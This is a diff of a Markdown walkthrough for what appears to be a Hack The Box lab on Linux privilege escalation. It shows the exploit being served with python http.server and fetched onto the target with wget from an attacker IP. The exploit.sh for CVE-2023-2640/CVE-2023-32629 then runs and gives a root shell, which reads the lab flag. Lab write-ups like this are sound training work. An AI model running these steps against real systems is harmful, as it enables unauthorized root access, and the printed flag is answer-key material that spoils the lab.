@@ -26,7 +26,7 @@ Login and survey:
     Linux version 5.4.0-45-generic (buildd@lgw01-amd64-033) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020
 
 
-Look up known CVEs:
+Look up known CVEs for this Linux version and kernel:
 
 - Search text:
 
@@ -42,12 +42,26 @@ Clone the repo:
 
 Upload the exploit and upload it to the server:
 
-    $ python -m http.server 9999
-    Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
+- Setup server:
 
+        $ python -m http.server 9999
+        Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
 
-    htb-student@nix03:~$ wget -rnH http://10.10.14.211:9999/CVE-2023-2640-CVE-2023-32629
+- Upload:
 
+        htb-student@nix03:~$ wget -rnH http://10.10.14.211:9999/CVE-2023-2640-CVE-2023-32629
+
+Escalate Privileges:
+
+    htb-student@nix03:~$ cd CVE-2023-2640-CVE-2023-32629
+    htb-student@nix03:~/CVE-2023-2640-CVE-2023-32629$ chmod +x exploit.sh
+    htb-student@nix03:~/CVE-2023-2640-CVE-2023-32629$ ./exploit.sh
+    [+] You should be root now
+    [+] Type 'exit' to finish and leave the house cleaned
+    root@nix03:~/CVE-2023-2640-CVE-2023-32629# id
+    uid=0(root) gid=1002(htb-student) groups=1002(htb-student)
+    root@nix03:~/CVE-2023-2640-CVE-2023-32629# cat /root/flag5.txt
+    LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
 
 
 Find other flags:
